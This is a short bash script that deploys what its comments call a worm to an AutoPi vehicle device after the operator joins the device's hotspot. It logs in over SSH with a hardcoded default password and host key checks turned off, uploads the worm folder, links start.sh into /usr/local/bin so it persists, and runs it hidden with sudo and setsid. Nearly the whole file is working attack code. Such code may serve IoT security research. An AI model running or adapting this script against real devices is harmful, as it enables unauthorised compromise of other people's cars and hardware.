#!/bin/bash

#When logged in to AutoPi hotspot run this script to start infection

cargo make

#Upload worm
sshpass -p 'autopi2018' scp -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -r hack_folder pi@192.168.4.1:/home/pi

#Run executing commands of the worm
sshpass -p 'autopi2018' ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -t pi@192.168.4.1 'cd hack_folder; sudo cp * ../; cd /usr/local/bin; sudo ln /home/pi/start.sh; cd /home/pi; sudo setsid /home/pi/start.sh &> /dev/null & exit'

